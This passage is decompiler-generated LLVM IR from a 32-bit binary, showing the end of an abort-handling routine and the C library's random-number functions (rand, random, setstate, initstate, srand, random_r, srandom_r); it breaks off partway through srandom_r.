  store i32 %v1_8050497, i32* %eax.global-to-local, align 4
  %v0_805049f.pre = load i8, i8* @global_var_805b474.139, align 4
  br label %dec_label_pc_805049f

dec_label_pc_805049f:                             ; preds = %dec_label_pc_8050467, %dec_label_pc_8050477
  %v2_805049f = phi i32 [ %v2_805049f4, %dec_label_pc_8050467 ], [ %v1_8050497, %dec_label_pc_8050477 ]
  %v0_805049f = phi i8 [ %v0_8050467, %dec_label_pc_8050467 ], [ %v0_805049f.pre, %dec_label_pc_8050477 ]
  %v1_805049f = zext i8 %v0_805049f to i32
  %v3_805049f = and i32 %v2_805049f, -256
  %v4_805049f = or i32 %v1_805049f, %v3_805049f
  store i32 %v4_805049f, i32* %eax.global-to-local, align 4
  %v10_80504a4 = icmp eq i8 %v0_805049f, 1
  %v1_80504a6 = icmp eq i1 %v10_80504a4, false
  br i1 %v1_80504a6, label %dec_label_pc_8050500, label %dec_label_pc_80504a8

dec_label_pc_80504a8:                             ; preds = %dec_label_pc_805049f
  store i8 2, i8* @global_var_805b474.139, align 4
  %v2_80504b7 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80504b7, i32* %eax.global-to-local, align 4
  %v3_80504bc = bitcast i32* %stack_var_-272 to i8*
  %v4_80504bc = call i32 @__GI_memset(i8* %v3_80504bc, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504d3

dec_label_pc_80504d3:                             ; preds = %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, %dec_label_pc_80504a8
  %v0_80504d3 = phi i32 [ %v12_805042e, %dec_label_pc_80504a8 ], [ %v0_80504d3.pre, %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge ]
  %v1_80504db21 = phi i32 [ 31, %dec_label_pc_80504a8 ], [ %v1_80504db, %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge ]
  %v2_80504d3 = mul i32 %v1_80504db21, 4
  %v3_80504d3 = add i32 %v2_80504d3, 16
  %v4_80504d3 = add i32 %v3_80504d3, %v0_80504d3
  %v5_80504d3 = inttoptr i32 %v4_80504d3 to i32*
  store i32 -1, i32* %v5_80504d3, align 4
  %v0_80504db.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80504db = add i32 %v0_80504db.pre, -1
  %v9_80504db = icmp slt i32 %v1_80504db, 0
  store i32 %v1_80504db, i32* %eax.global-to-local, align 4
  %v1_80504dc = icmp eq i1 %v9_80504db, false
  br i1 %v1_80504dc, label %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, label %dec_label_pc_80504de

dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge: ; preds = %dec_label_pc_80504d3
  %v0_80504d3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80504d3

dec_label_pc_80504de:                             ; preds = %dec_label_pc_80504d3
  store i32 %v2_80504b7, i32* %eax.global-to-local, align 4
  %v4_80504f3 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80504f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050477

dec_label_pc_8050500:                             ; preds = %dec_label_pc_805049f
  %v10_8050500 = icmp eq i8 %v0_805049f, 2
  %v1_8050502 = icmp eq i1 %v10_8050500, false
  br i1 %v1_8050502, label %dec_label_pc_805050c, label %dec_label_pc_805050c.thread

dec_label_pc_805050c.thread:                      ; preds = %dec_label_pc_8050500
  store i8 3, i8* @global_var_805b474.139, align 4
  br label %dec_label_pc_8050515

dec_label_pc_805050c:                             ; preds = %dec_label_pc_8050500
  %v9_805050c = icmp eq i8 %v0_805049f, 3
  %v1_8050513 = icmp eq i1 %v9_805050c, false
  br i1 %v1_8050513, label %dec_label_pc_8050526, label %dec_label_pc_8050515

dec_label_pc_8050515:                             ; preds = %dec_label_pc_805050c.thread, %dec_label_pc_805050c
  store i8 4, i8* @global_var_805b474.139, align 4
  %v1_8050521 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8050526:                             ; preds = %dec_label_pc_805050c, %dec_label_pc_8050526
  br label %dec_label_pc_8050526

; uselistorder directives
  uselistorder i32 %v1_80504db, { 2, 1, 0 }
  uselistorder i32 %v1_805043e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 14, 11, 13, 12, 1 }
  uselistorder i8 3, { 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805b474.139, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050526, { 1, 0 }
  uselistorder label %dec_label_pc_8050515, { 1, 0 }
  uselistorder label %dec_label_pc_805049f, { 1, 0 }
  uselistorder label %dec_label_pc_8050467, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_805052c = call i32 @random()
  ret i32 %v0_805052c

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 0, 5, 4, 3, 2, 1, 8, 7, 6 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050534 = load i32, i32* @ebx, align 4
  store i32 %v0_8050534, i32* %stack_var_-4, align 4
  %v2_8050542 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050542, i32* @ebx, align 4
  %v2_8050547 = call i32 @__pthread_return_void(i32 %v2_8050542, i32 134548959)
  %v1_8050553 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055320.140 to i32))
  %v2_805055a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050564 = call i32 @__GI_random_r(i32* nonnull @global_var_8055338, i32 %v2_805055a)
  store i32 ptrtoint (i32* @global_var_8055338 to i32), i32* @eax, align 4
  %v2_805056e = call i32 @__pthread_return_void(i32 %v2_8050542, i32 1)
  %v3_8050573 = load i32, i32* %stack_var_-8, align 4
  %v2_805057a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805057a, i32* @ebx, align 4
  ret i32 %v3_8050573
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_805058d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805058d, i32* @eax, align 4
  %v2_8050592 = call i32 @__pthread_return_void(i32 %v2_805058d, i32 134548959)
  %v1_805059e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055320.140 to i32))
  %v0_80505aa = load i32, i32* bitcast (i32** @global_var_8055340.143 to i32*), align 64
  store i32 %v0_80505aa, i32* @ebx, align 4
  %v3_80505b4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8055338)
  %v2_80505bc = icmp slt i32 %v3_80505b4, 0
  br i1 %v2_80505bc, label %dec_label_pc_80505c3, label %dec_label_pc_80505c0

dec_label_pc_80505c0:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805533c.144 to i32), i32* @esi, align 4
  br label %dec_label_pc_80505c3

dec_label_pc_80505c3:                             ; preds = %entry, %dec_label_pc_80505c0
  store i32 %v2_805058d, i32* @eax, align 4
  %v2_80505cc = call i32 @__pthread_return_void(i32 %v2_805058d, i32 1)
  %v0_80505d1 = load i32, i32* @esi, align 4
  ret i32 %v0_80505d1

; uselistorder directives
  uselistorder label %dec_label_pc_80505c3, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80505e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80505e8, i32* @ebx, align 4
  %v2_80505ed = call i32 @__pthread_return_void(i32 %v2_80505e8, i32 134548959)
  %v1_80505f9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055320.140 to i32))
  %v0_8050603 = load i32, i32* bitcast (i32** @global_var_8055340.143 to i32*), align 64
  store i32 %v0_8050603, i32* @esi, align 4
  %v4_8050615 = inttoptr i32 %arg2 to i32*
  %v5_8050615 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8050615, i32 %arg3, i32 ptrtoint (i32* @global_var_8055338 to i32))
  store i32 %v5_8050615, i32* @eax, align 4
  %v2_8050620 = call i32 @__pthread_return_void(i32 %v2_80505e8, i32 1)
  ret i32 ptrtoint (i32** @global_var_805533c.144 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050630 = load i32, i32* @ebx, align 4
  store i32 %v0_8050630, i32* %stack_var_-4, align 4
  %v2_805063e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805063e, i32* @ebx, align 4
  %v2_8050643 = call i32 @__pthread_return_void(i32 %v2_805063e, i32 134548959)
  %v1_805064f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8055320.140 to i32))
  %v2_805065f = sext i32 %arg1 to i64
  %v3_805065f = call i32 @srandom_r(i64 %v2_805065f, i32 ptrtoint (i32* @global_var_8055338 to i32))
  store i32 ptrtoint (i32* @global_var_8055338 to i32), i32* @eax, align 4
  %v2_8050669 = call i32 @__pthread_return_void(i32 %v2_805063e, i32 1)
  %v2_8050671 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050671, i32* @ebx, align 4
  ret i32 %v2_8050669

; uselistorder directives
  uselistorder i32* @global_var_8055338, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055338 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8050677 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8050683 = add i32 %arg1, 4
  store i32 %v1_8050683, i32* %esi.global-to-local, align 4
  %v1_8050686 = add i32 %tmp4, 12
  %v2_8050686 = inttoptr i32 %v1_8050686 to i32*
  %v3_8050686 = load i32, i32* %v2_8050686, align 4
  store i32 %v3_8050686, i32* %ecx.global-to-local, align 4
  %v1_8050689 = add i32 %tmp4, 8
  %v2_8050689 = inttoptr i32 %v1_8050689 to i32*
  %v3_8050689 = load i32, i32* %v2_8050689, align 4
  %v1_805068c = icmp eq i32 %v3_8050686, 0
  %v1_805068e = icmp eq i1 %v1_805068c, false
  br i1 %v1_805068e, label %dec_label_pc_8050699, label %dec_label_pc_8050690

dec_label_pc_8050690:                             ; preds = %entry
  %v1_8050690 = add i32 %v3_8050689, -4
  %v2_8050690 = inttoptr i32 %v1_8050690 to i32*
  store i32 0, i32* %v2_8050690, align 4
  br label %dec_label_pc_80506a9

dec_label_pc_8050699:                             ; preds = %entry
  %v1_8050699 = add i32 %tmp4, 4
  %v2_8050699 = inttoptr i32 %v1_8050699 to i32*
  %v3_8050699 = load i32, i32* %v2_8050699, align 4
  %v2_805069c = sub i32 %v3_8050699, %v3_8050689
  %v2_805069e = sdiv i32 %v2_805069c, 4
  %v3_80506a1 = mul i32 %v2_805069e, 5
  %v2_80506a4 = add i32 %v3_80506a1, %v3_8050686
  store i32 %v2_80506a4, i32* %eax.global-to-local, align 4
  %v2_80506a6 = add i32 %v3_8050689, -4
  %v3_80506a6 = inttoptr i32 %v2_80506a6 to i32*
  store i32 %v2_80506a4, i32* %v3_80506a6, align 4
  br label %dec_label_pc_80506a9

dec_label_pc_80506a9:                             ; preds = %dec_label_pc_8050690, %dec_label_pc_8050699
  %v0_80506a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506a9 = add i32 %v0_80506a9, -4
  %v2_80506a9 = inttoptr i32 %v1_80506a9 to i32*
  %v3_80506a9 = load i32, i32* %v2_80506a9, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80506b1 = ashr i32 %v3_80506a9, 31
  %v2_80506b2 = zext i32 %v3_80506a9 to i64
  %v4_80506b2 = zext i32 %v1_80506b1 to i64
  %v5_80506b2 = mul nuw i64 %v4_80506b2, 4294967296
  %v6_80506b2 = or i64 %v5_80506b2, %v2_80506b2
  %v8_80506b2 = sdiv i64 %v6_80506b2, 5
  %v9_80506b2 = trunc i64 %v8_80506b2 to i32
  store i32 %v9_80506b2, i32* %eax.global-to-local, align 4
  %v10_80506b2 = srem i64 %v6_80506b2, 5
  %v11_80506b2 = trunc i64 %v10_80506b2 to i32
  %v6_80506b7 = icmp ugt i32 %v11_80506b2, 4
  br i1 %v6_80506b7, label %dec_label_pc_80506f7, label %dec_label_pc_80506b9

dec_label_pc_80506b9:                             ; preds = %dec_label_pc_80506a9
  %v1_80506b9 = mul i32 %v11_80506b2, 4
  %v2_80506b9 = add i32 %v1_80506b9, ptrtoint (i32* @global_var_8053db4.145 to i32)
  %v3_80506b9 = inttoptr i32 %v2_80506b9 to i32*
  %v4_80506b9 = load i32, i32* %v3_80506b9, align 4
  store i32 %v4_80506b9, i32* %ecx.global-to-local, align 4
  %v2_80506c0 = add i32 %v1_80506b9, ptrtoint (i32* @global_var_8053da0.146 to i32)
  %v3_80506c0 = inttoptr i32 %v2_80506c0 to i32*
  %v4_80506c0 = load i32, i32* %v3_80506c0, align 4
  store i32 %v4_80506c0, i32* %ebp.global-to-local, align 4
  %v1_80506c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506c7 = add i32 %v1_80506c7, 16
  %v3_80506c7 = inttoptr i32 %v2_80506c7 to i32*
  store i32 %v4_80506b9, i32* %v3_80506c7, align 4
  %v0_80506ca = load i32, i32* %ebp.global-to-local, align 4
  %v1_80506ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506ca = add i32 %v1_80506ca, 20
  %v3_80506ca = inttoptr i32 %v2_80506ca to i32*
  store i32 %v0_80506ca, i32* %v3_80506ca, align 4
  %v1_80506cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506cd = add i32 %v1_80506cd, 12
  %v3_80506cd = inttoptr i32 %v2_80506cd to i32*
  store i32 %v11_80506b2, i32* %v3_80506cd, align 4
  %v1_80506d0 = icmp eq i32 %v11_80506b2, 0
  br i1 %v1_80506d0, label %dec_label_pc_80506ea, label %dec_label_pc_80506d4

dec_label_pc_80506d4:                             ; preds = %dec_label_pc_80506b9
  %v0_80506d4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506d4 = add i32 %v0_80506d4, -4
  %v2_80506d4 = inttoptr i32 %v1_80506d4 to i32*
  %v3_80506d4 = load i32, i32* %v2_80506d4, align 4
  %v1_80506d7 = ashr i32 %v3_80506d4, 31
  %v0_80506d8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80506d8 = zext i32 %v3_80506d4 to i64
  %v4_80506d8 = zext i32 %v1_80506d7 to i64
  %v5_80506d8 = mul nuw i64 %v4_80506d8, 4294967296
  %v6_80506d8 = or i64 %v5_80506d8, %v2_80506d8
  %v7_80506d8 = zext i32 %v0_80506d8 to i64
  %v8_80506d8 = sdiv i64 %v6_80506d8, %v7_80506d8
  %v9_80506d8 = trunc i64 %v8_80506d8 to i32
  %v2_80506da = mul i32 %v9_80506d8, 4
  %v3_80506da = add i32 %v2_80506da, %v0_80506d4
  %v1_80506dd = load i32, i32* %ebp.global-to-local, align 4
  %v2_80506dd = add i32 %v1_80506dd, %v9_80506d8
  store i32 %v2_80506dd, i32* %eax.global-to-local, align 4
  %v1_80506df = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506df = add i32 %v1_80506df, 4
  %v3_80506df = inttoptr i32 %v2_80506df to i32*
  store i32 %v3_80506da, i32* %v3_80506df, align 4
  %v0_80506e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506e2 = ashr i32 %v0_80506e2, 31
  %v0_80506e3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506e3 = zext i32 %v0_80506e2 to i64
  %v4_80506e3 = zext i32 %v1_80506e2 to i64
  %v5_80506e3 = mul nuw i64 %v4_80506e3, 4294967296
  %v6_80506e3 = or i64 %v5_80506e3, %v2_80506e3
  %v7_80506e3 = zext i32 %v0_80506e3 to i64
  %v8_80506e3 = sdiv i64 %v6_80506e3, %v7_80506e3
  %v9_80506e3 = trunc i64 %v8_80506e3 to i32
  store i32 %v9_80506e3, i32* %eax.global-to-local, align 4
  %v10_80506e3 = srem i64 %v6_80506e3, %v7_80506e3
  %v11_80506e3 = trunc i64 %v10_80506e3 to i32
  %v0_80506e5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80506e5 = mul i32 %v11_80506e3, 4
  %v3_80506e5 = add i32 %v2_80506e5, %v0_80506e5
  %v1_80506e8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506e8 = inttoptr i32 %v1_80506e8 to i32*
  store i32 %v3_80506e5, i32* %v2_80506e8, align 4
  br label %dec_label_pc_80506ea

dec_label_pc_80506ea:                             ; preds = %dec_label_pc_80506b9, %dec_label_pc_80506d4
  %v0_80506ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80506ea = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506ea = mul i32 %v1_80506ea, 4
  %v3_80506ea = add i32 %v2_80506ea, %v0_80506ea
  store i32 %v3_80506ea, i32* %eax.global-to-local, align 4
  %v1_80506ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506ed = add i32 %v1_80506ed, 8
  %v3_80506ed = inttoptr i32 %v2_80506ed to i32*
  store i32 %v0_80506ea, i32* %v3_80506ed, align 4
  %v0_80506f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506f0 = add i32 %v1_80506f0, 24
  %v3_80506f0 = inttoptr i32 %v2_80506f0 to i32*
  store i32 %v0_80506f0, i32* %v3_80506f0, align 4
  br label %dec_label_pc_8050705

dec_label_pc_80506f7:                             ; preds = %dec_label_pc_80506a9
  %v1_80506f7 = call i32 @__errno_location(i32 %v0_8050677)
  store i32 %v1_80506f7, i32* %eax.global-to-local, align 4
  %v1_80506fc = inttoptr i32 %v1_80506f7 to i32*
  store i32 22, i32* %v1_80506fc, align 4
  br label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506ea, %dec_label_pc_80506f7
  %storemerge = phi i32 [ -1, %dec_label_pc_80506f7 ], [ 0, %dec_label_pc_80506ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050677, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80506ea, { 1, 0 }
  uselistorder i32 %v11_80506b2, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8050705, { 1, 0 }
  uselistorder label %dec_label_pc_80506ea, { 1, 0 }
  uselistorder label %dec_label_pc_80506a9, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050710 = load i32, i32* @ebx, align 4
  store i32 %v0_8050710, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050719 = add i32 %tmp2, 8
  %v2_8050719 = inttoptr i32 %v1_8050719 to i32*
  %v3_8050719 = load i32, i32* %v2_8050719, align 4
  store i32 %v3_8050719, i32* %esi.global-to-local, align 4
  %v1_805071c = add i32 %tmp2, 12
  %v2_805071c = inttoptr i32 %v1_805071c to i32*
  %v3_805071c = load i32, i32* %v2_805071c, align 4
  %v4_805071c = icmp eq i32 %v3_805071c, 0
  %v1_8050720 = icmp eq i1 %v4_805071c, false
  br i1 %v1_8050720, label %dec_label_pc_8050739, label %dec_label_pc_8050722

dec_label_pc_8050722:                             ; preds = %entry
  %v2_8050722 = inttoptr i32 %v3_8050719 to i32*
  %v3_8050722 = load i32, i32* %v2_8050722, align 4
  %v5_8050722 = mul i32 %v3_8050722, 1103515245
  %v1_8050728 = add i32 %v5_8050722, 12345
  %v1_805072d = urem i32 %v1_8050728, -2147483648
  store i32 %v1_805072d, i32* %eax.global-to-local, align 4
  store i32 %v1_805072d, i32* %v2_8050722, align 4
  %v0_8050734 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050734 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050734 = inttoptr i32 %v1_8050734 to i32*
  store i32 %v0_8050734, i32* %v2_8050734, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050739:                             ; preds = %entry
  %v1_8050739 = add i32 %tmp2, 4
  %v2_8050739 = inttoptr i32 %v1_8050739 to i32*
  %v3_8050739 = load i32, i32* %v2_8050739, align 4
  store i32 %v3_8050739, i32* %ecx.global-to-local, align 4
  %v2_805073c = load i32, i32* %arg1, align 4
  store i32 %v2_805073c, i32* %edx.global-to-local, align 4
  %v1_805073e = add i32 %tmp2, 24
  %v2_805073e = inttoptr i32 %v1_805073e to i32*
  %v3_805073e = load i32, i32* %v2_805073e, align 4
  store i32 %v3_805073e, i32* %edi.global-to-local, align 4
  %v1_8050741 = inttoptr i32 %v3_8050739 to i32*
  %v2_8050741 = load i32, i32* %v1_8050741, align 4
  store i32 %v2_8050741, i32* %eax.global-to-local, align 4
  %v1_8050743 = inttoptr i32 %v2_805073c to i32*
  %v2_8050743 = load i32, i32* %v1_8050743, align 4
  %v4_8050743 = add i32 %v2_8050743, %v2_8050741
  store i32 %v4_8050743, i32* %v1_8050743, align 4
  %v0_8050745 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050745 = inttoptr i32 %v0_8050745 to i32*
  %v2_8050745 = load i32, i32* %v1_8050745, align 4
  %v1_8050747 = add i32 %v0_8050745, 4
  store i32 %v1_8050747, i32* %edx.global-to-local, align 4
  %v2_805074a = udiv i32 %v2_8050745, 2
  %v1_805074c = load i32, i32* %edi.global-to-local, align 4
  %v7_805074c = icmp ult i32 %v1_8050747, %v1_805074c
  %v1_805074e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805074e = inttoptr i32 %v1_805074e to i32*
  store i32 %v2_805074a, i32* %v2_805074e, align 4
  %v0_8050751 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050751 = add i32 %v0_8050751, 4
  store i32 %v1_8050751, i32* %eax.global-to-local, align 4
  br i1 %v7_805074c, label %dec_label_pc_805075a, label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %dec_label_pc_8050739
  %v0_8050756 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050756, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050760

dec_label_pc_805075a:                             ; preds = %dec_label_pc_8050739
  %v1_805075a = load i32, i32* %edi.global-to-local, align 4
  %v7_805075a = icmp ult i32 %v1_8050751, %v1_805075a
  br i1 %v7_805075a, label %dec_label_pc_8050760, label %dec_label_pc_805075e

dec_label_pc_805075e:                             ; preds = %dec_label_pc_805075a
  %v0_805075e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805075e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050760

dec_label_pc_8050760:                             ; preds = %dec_label_pc_805075a, %dec_label_pc_8050756, %dec_label_pc_805075e
  %v0_8050760 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050760 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050760 = inttoptr i32 %v1_8050760 to i32*
  store i32 %v0_8050760, i32* %v2_8050760, align 4
  %v0_8050762 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050762 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050762 = add i32 %v1_8050762, 4
  %v3_8050762 = inttoptr i32 %v2_8050762 to i32*
  store i32 %v0_8050762, i32* %v3_8050762, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050765:                             ; preds = %dec_label_pc_8050722, %dec_label_pc_8050760
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050767 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050767, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805072d, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050765, { 1, 0 }
  uselistorder label %dec_label_pc_8050760, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_805076c = load i32, i32* @ebp, align 4
  %v0_805076d = load i32, i32* @edi, align 4
  %v0_805076e = load i32, i32* @esi, align 4
  %v0_805076f = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_805077a = trunc i64 %arg1 to i32
  store i32 %v4_805077a, i32* %eax.global-to-local, align 4
  %v1_805077e = add i32 %arg2, 12
  %v2_805077e = inttoptr i32 %v1_805077e to i32*
  %v3_805077e = load i32, i32* %v2_805077e, align 4
  store i32 %v3_805077e, i32* %edx.global-to-local, align 4
  %v6_8050784 = icmp ugt i32 %v3_805077e, 4
  br i1 %v6_8050784, label %dec_label_pc_80507f8, label %dec_label_pc_8050786

dec_label_pc_8050786:                             ; preds = %entry
  %v1_8050786 = add i32 %arg2, 8
  %v2_8050786 = inttoptr i32 %v1_8050786 to i32*
  %v3_8050786 = load i32, i32* %v2_8050786, align 4
  store i32 %v3_8050786, i32* %ebx.global-to-local, align 4
  %v1_8050789 = icmp eq i32 %v4_805077a, 0
  %v1_805078b = icmp eq i1 %v1_8050789, false
  br i1 %v1_805078b, label %dec_label_pc_805078f, label %dec_label_pc_805078d

dec_label_pc_805078d:                             ; preds = %dec_label_pc_8050786
  %v1_805078d = and i32 %v4_805077a, -256
  %v2_805078d = or i32 %v1_805078d, 1
  store i32 %v2_805078d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805078f

dec_label_pc_805078f:                             ; preds = %dec_label_pc_8050786, %dec_label_pc_805078d
  %v0_805078f = phi i32 [ %v4_805077a, %dec_label_pc_8050786 ], [ %v2_805078d, %dec_label_pc_805078d ]
  %v2_805078f = inttoptr i32 %v3_8050786 to i32*
  store i32 %v0_805078f, i32* %v2_805078f, align 4
  %v1_8050791 = icmp eq i32 %v3_805077e, 0
  br i1 %v1_8050791, label %dec_label_pc_80507f6, label %dec_label_pc_8050795

dec_label_pc_8050795:                             ; preds = %dec_label_pc_805078f
  %v0_8050795 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050795, i32* %edx.global-to-local, align 4
  %v0_8050797 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050797, i32* %ecx.global-to-local, align 4
  %v0_8050799 = load i32, i32* @esi, align 4
  %v1_8050799 = add i32 %v0_8050799, 16
  %v2_8050799 = inttoptr i32 %v1_8050799 to i32*
  %v3_8050799 = load i32, i32* %v2_8050799, align 4
  store i32 %v3_8050799, i32* %eax.global-to-local, align 4
  %v4_80507a1 = sext i32 %v3_8050799 to i64
  store i64 %v4_80507a1, i64* %stack_var_-40, align 8
  %v5_80507d327 = icmp sgt i32 %v3_8050799, 1
  br i1 %v5_80507d327, label %dec_label_pc_80507a6, label %dec_label_pc_80507d5

dec_label_pc_80507a6:                             ; preds = %dec_label_pc_8050795, %dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge
  %v0_80507ca = phi i32 [ %v0_80507ca.pre, %dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge ], [ %v0_8050797, %dec_label_pc_8050795 ]
  %v0_80507a6 = phi i32 [ %v0_80507a6.pre, %dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge ], [ %v0_8050795, %dec_label_pc_8050795 ]
  %v0_80507cd28 = phi i32 [ %v0_80507d0.pre, %dec_label_pc_80507a6.dec_label_pc_80507a6_crit_edge ], [ 1, %dec_label_pc_8050795 ]
  %v1_80507ad = ashr i32 %v0_80507a6, 31
  %v2_80507ae = zext i32 %v0_80507a6 to i64
  %v4_80507ae = zext i32 %v1_80507ad to i64
  %v5_80507ae = mul nuw i64 %v4_80507ae, 4294967296
  %v6_80507ae = or i64 %v5_80507ae, %v2_80507ae
  %v8_80507ae = sdiv i64 %v6_80507ae, 127773
  %v9_80507ae = trunc i64 %v8_80507ae to i32
  %v10_80507ae = srem i64 %v6_80507ae, 127773
  %v3_80507b4 = mul nsw i64 %v10_80507ae, 16807
  %v4_80507b4 = trunc i64 %v3_80507b4 to i32
